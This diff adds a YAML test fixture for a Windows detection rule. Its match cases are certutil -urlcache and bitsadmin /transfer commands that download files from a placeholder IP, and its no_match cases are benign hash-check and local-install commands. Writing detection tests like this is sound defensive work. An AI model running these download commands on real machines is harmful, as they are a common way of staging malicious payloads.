@@ -1,0 +1,11 @@
+rule_id: DET-WIN-009
+match:
+  - name: certutil urlcache
+    event: {event_type: process_creation, process: {name: certutil.exe, command_line: "certutil.exe -urlcache -f http://198.51.100.23/readme.txt readme.txt"}}
+  - name: bitsadmin transfer
+    event: {event_type: process_creation, process: {name: bitsadmin.exe, command_line: "bitsadmin /transfer job http://198.51.100.23/a.txt C:\\a.txt"}}
+no_match:
+  - name: certutil hash check
+    event: {event_type: process_creation, process: {name: certutil.exe, command_line: "certutil -hashfile setup.msi SHA256"}}
+  - name: msiexec local install
+    event: {event_type: process_creation, process: {name: msiexec.exe, command_line: "msiexec /i C:\\pkg\\agent.msi /qn"}}
